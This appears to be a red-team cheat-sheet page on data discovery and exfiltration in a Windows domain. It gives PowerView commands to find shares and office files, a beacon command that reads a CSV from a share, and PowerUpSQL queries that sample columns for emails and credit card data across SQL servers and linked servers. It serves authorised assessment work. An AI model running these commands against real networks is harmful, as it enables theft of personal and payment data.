---
title: Exfiltration
category: Red Team
order: 16
---

Organizations will store data in a wide variety of places from file shares, databases, SharePoint, internal wiki's, etc...

> **Note**: When planning the assessment, a good strategy to suggest is to create dummy data. It is not recommended to carry out exfiltration tests with real data (Problems with GDPR).

# File Shares

We can search for shares on a domain.

* PowerView (dev):
```powershell
Find-DomainShare 
Find-DomainShare -CheckShareAccess
```

`Find-InterestingDomainShareFile` searches inside each share, and returns results where the specified strings appears.

* PowerView (dev):
```powershell
Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
```

Finally we can download it:

```
beacon> powershell gc \\share.corp.io\share\export.csv | select -first 5
```

# Databases

`PowerUpSQL` provides various cmdlets designed for data searching and extraction.

`Get-SQLColumnSampleDataThreaded` can search one or more instances for databases that contains particular keywords in the column names.

```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```

This can only search the instances where we have direct access, it will not try any SQL link. To search over the links use `Get-SQLQuery`.

```
 beacon> powershell Get-SQLQuery -Instance "sql-2.corp.local,1433" -Query "select * from openquery(""sql-1.external.local"", 'select * from information_schema.tables')"
```